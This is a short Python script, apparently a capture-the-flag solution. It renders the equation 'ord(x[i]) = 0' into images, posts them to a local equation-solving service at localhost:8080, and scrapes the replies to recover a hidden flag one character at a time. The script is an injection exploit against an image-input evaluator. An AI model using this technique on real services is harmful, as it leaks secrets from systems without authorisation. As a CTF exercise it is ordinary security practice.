from io import BytesIO

from PIL import Image, ImageDraw, ImageFont
from bs4 import BeautifulSoup
from requests import post as post_request


def craft_image(text: str) -> Image.Image:
    image = Image.new("RGB", (512, 128), "white")
    draw = ImageDraw.Draw(image)

    font = ImageFont.truetype("arial.ttf", 64)
    draw.text((256, 64), text, (0, 0, 0), font, "mm")

    return image


flag = ""
for idx in range(14):
    # Craft the image from the string
    equation_text = f"ord(x[{idx}]) = 0"
    equation_image = craft_image(equation_text)

    # Convert the image into bytes to upload
    buffer = BytesIO()
    equation_image.save(buffer, "PNG")
    image_bytes = buffer.getvalue()

    # Send the request and objectify the response
    url = "http://localhost:8080/equation"
    response = post_request(url, files={"file": image_bytes})
    soup = BeautifulSoup(response.text, "html.parser")

    result = soup.find("h1").text
    flag_char = chr(int(result.split()[5]))
    flag += flag_char

print(flag)
